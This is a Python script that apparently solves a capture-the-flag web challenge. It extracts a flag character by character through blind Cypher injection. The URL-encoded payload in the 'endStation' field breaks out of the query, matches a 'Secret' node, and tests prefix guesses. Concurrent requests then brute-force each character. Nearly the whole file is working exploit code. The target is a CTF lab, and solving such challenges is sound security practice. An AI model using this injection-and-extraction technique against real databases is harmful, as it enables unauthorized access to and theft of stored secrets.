import asyncio
import aiohttp

url = "https://tbtl-mexico-city-tour.chals.io/search"
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
current = "TBTL{wh3R3_15_"

async def test_character(session, char):
    """
    Test a character by sending a POST request with the character appended to the current string.

    Args:
        session (aiohttp.ClientSession): The client session used to send the POST request.
        char (str): The character to test.

    Returns:
        Tuple[str, bool]: A tuple containing the tested character and a boolean indicating if the distance is 1.
    """
    print(current + char)
    payload = {
        'data': f'startStation=1&endStation=2%7D)%20MATCH%20(a%3ASecret%20%7Bname%3A%20%22FLAG%22%7D)%20RETURN%20CASE%20WHEN%20a.flag%20STARTS%20WITH%20\'{current + char}\'%20THEN%201%20ELSE%200%20END%20AS%20distance%3B%20%2F%2F'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://tbtl-mexico-city-tour.chals.io',
        'Connection': 'keep-alive',
        'Referer': 'https://tbtl-mexico-city-tour.chals.io/?distance=23',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1'
    }
    async with session.post(url, headers=headers, data=payload['data']) as response:
        text = await response.text()
        return char, 'Distance is 1' in text

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [test_character(session, char) for char in characters]
        results = await asyncio.gather(*tasks)
        for char, result in results:
            if result:
                return char  # Return or break depending on whether you want to stop at the first match

# Run the async main function
if __name__ == "__main__":
    while True:
        found_char = asyncio.run(main())
        current += found_char # type: ignore

        print(current)

        if current.endswith("}"):
            break